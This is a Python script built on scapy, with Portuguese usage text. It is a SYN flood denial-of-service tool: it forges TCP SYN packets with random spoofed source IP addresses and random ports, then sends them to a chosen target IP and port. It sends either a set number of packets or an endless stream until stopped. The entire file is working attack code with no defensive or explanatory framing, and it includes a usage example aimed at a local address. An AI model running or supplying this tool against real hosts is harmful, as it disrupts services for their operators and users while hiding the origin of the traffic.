from scapy.all import *
from random import randint
from argparse import ArgumentParser
import time

Uso_d = '''Uso: python3 [--interface INTERFACE_DE_REDE] Syn_Flood_Attack.py  [-h] [--alvo ALVO] [--porta PORTA]
                           [--pacotes ] [--version]
optional arguments:
  -h, --help            Mostra mensagens de ajuda e sai.
  
  --alvo ALVO, -a ALVO

  --porta PORTA DO ALVO, -p PORTA DO ALVO 

  --pacotes NÚMERO DE PACOTES , -pc NÚMERO DE PACOTES
                        
  --versão, -v         Mostra a versão do porgrama e sai'''

def Inteiro_randomico():
    '''Portas aleatórias'''
    A = randint(1000, 20000)
    return A

def IP_aleatorio():
    ''' IP SPOOF'''
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip

def SYN_Flood(IP_destino, Porta_destino,controle = 0):
    enviados = 1
    s_port = Inteiro_randomico()
    s_eq = Inteiro_randomico()
    w_indow = Inteiro_randomico()
    IP_Pacote = IP ()
    IP_Pacote.src = IP_aleatorio()
    IP_Pacote.dst = IP_destino
    TCP_Pacote = TCP ()
    TCP_Pacote.sport = s_port
    TCP_Pacote.dport = int(Porta_destino)
    TCP_Pacote.flags = "S"
    TCP_Pacote.seq = s_eq
    TCP_Pacote.window = w_indow
    
    if controle != 0:
        for numero in range(controle):
            send(IP_Pacote/TCP_Pacote/bytes(1000), verbose=0)
            enviados+=1
            sys.stdout.write("Pacotes enviados: %i\n\r" % enviados)
            sys.stdout.write("\033[F")
        exit(0)
            
    send(IP_Pacote/TCP_Pacote/bytes(1000),loop=1, verbose=1)
    #stdout.write("\nPacotes enviados: %i\n" % enviados)
    sys.stdout.write("\033[F")

def Func_main():
    
    parser = ArgumentParser()
    parser.add_argument('--interface','-in', help='interface de rede')
    parser.add_argument('--alvo', '-a', help='IP alvo')
    parser.add_argument('--porta', '-p', help='Porta alvo')
    parser.add_argument('--pacotes', '-pc', help='Número de pacotes')
    parser.add_argument('--versão', '-v', action='version', version='Python SynFlood 0.1\RamonLean')
    parser.epilog = """Uso: python3 [interface_de_rede] Syn_Flood_Attack.py  [-h] [--alvo ALVO] [--porta PORTA] [--pacotes ] [--versão]
\nUso: python3 wlan0 Syn_Flood_Attack -a 192.168.100.1 -p 80 -pc 10"""
    args = parser.parse_args()

    if args.interface is not None:
        scapy.all.conf.iface = args.interface
        print("Utiliando interface: ", scapy.all.conf.iface)
    else:
        args.interface = scapy.all.conf.iface
        print("Como nenhuma interface foi selecionada, utilizando a interface: ", scapy.all.conf.iface)
        time.sleep(2)
    if args.alvo is not None and args.porta is not None:
        
        if args.pacotes is None:
            print('\nVocê não definiu a quantidade de pacotes, então o ataque continuará até control + c serem pressionadas\n')
            args.pacotes = 0
            time.sleep(2)
            SYN_Flood(args.alvo, args.porta, int(args.pacotes))
            
        else:
            time.sleep(2)
            SYN_Flood(args.alvo, args.porta, int(args.pacotes))
    else:
        print (Uso_d)
        exit(1)
        
    exit(0)
    
Func_main()

    
            


    
